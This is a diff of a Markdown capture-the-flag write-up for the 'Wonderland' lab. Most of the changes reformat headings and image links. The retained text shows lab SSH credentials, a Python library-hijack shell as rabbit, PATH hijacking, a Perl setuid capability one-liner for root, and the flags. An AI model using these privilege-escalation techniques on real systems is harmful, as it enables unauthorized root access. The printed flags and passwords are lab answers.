@@ -1,31 +1,30 @@
 ---
 sticker: emoji//1f430
 ---
+# ENUMERATION
+---
 
-# WONDERLAND
 
-## ENUMERATION
 
-***
+## OPEN PORTS
+---
 
-### OPEN PORTS
-
-***
 
 | PORT | SERVICE |
-| ---- | ------- |
+| :--- | :------ |
 | 22   | SSH     |
 | 80   | HTTP    |
 
-## RECONNAISSANCE
 
-***
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250410172011.png)
+# RECONNAISSANCE
+---
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250410172011.png)
 
 We can see this on the website, if we extract the data from the image, we can see this:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250410172036.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250410172036.png)
 
 Based on the hint, we can think that, we can find a hidden directory at:
 
@@ -63,13 +62,15 @@ r                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 161
 poem                    [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 169ms]
 ```
 
+
 Using the logic, we know that the directory I thought about, was correct, if we visit it, we can find this:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250410172251.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250410172251.png)
+
 
 If we check the source code on here:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250410172312.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250410172312.png)
 
 We got some credentials maybe:
 
@@ -77,15 +78,17 @@ We got some credentials maybe:
 alice:HowDothTheLittleCrocodileImproveHisShiningTail
 ```
 
+
 If we go to ssh and try these credentials, we get the following:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250410172532.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250410172532.png)
 
 They were the credentials for ssh, let's proceed to privilege escalation.
 
-## PRIVILEGE ESCALATION
 
-***
+# PRIVILEGE ESCALATION
+---
+
 
 Now, we got access to `ssh`, we can check the following if we use `sudo -l`:
 
@@ -250,7 +253,7 @@ os.system('/bin/bash')
 sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250410173359.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250410173359.png)
 
 Nice, we were able to get the shell as `rabbit`, if we check the home of this user, we can find this:
 
@@ -381,7 +384,7 @@ export PATH=.:$PATH
 ./teaParty
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250410174605.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250410174605.png)
 
 We can see we got a shell as `hatter`, let's check our home:
 
@@ -399,13 +402,14 @@ WhyIsARavenLikeAWritingDesk?
 
 We can migrate to ssh with these credentials. Now, let's check our sudo privileges:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250410174723.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250410174723.png)
 
 We got no sudo permissions, weird, maybe we can check more stuff with linpeas:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250410175343.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250410175343.png)
 
-We got capabilities set, **Capabilities** in Linux are a way to grant _specific privileges_ to a process or binary **without giving it full root access**. They break down the monolithic "root vs. non-root" model into **granular permissions**, allowing fine-grained control over what a program can do.
+
+We got capabilities set, **Capabilities** in Linux are a way to grant _specific privileges_ to a process or binary **without giving it full root access**. They break down the monolithic "root vs. non-root" model into **granular permissions**, allowing fine-grained control over what a program can do.
 
 Knowing this, we can exploit it in the following way to get root:
 
@@ -413,9 +417,9 @@ Knowing this, we can exploit it in the following way to get root:
 /usr/bin/perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250410175608.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250410175608.png)
 
-There we go, we got root access, we can now read both flags,
+There we go, we got root access, we can now read both flags, 
 
 ```
 root@wonderland:~# cat /root/user.txt
@@ -427,4 +431,5 @@ root@wonderland:~# cat /home/alice/root.txt
 thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250410175738.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250410175738.png)
+
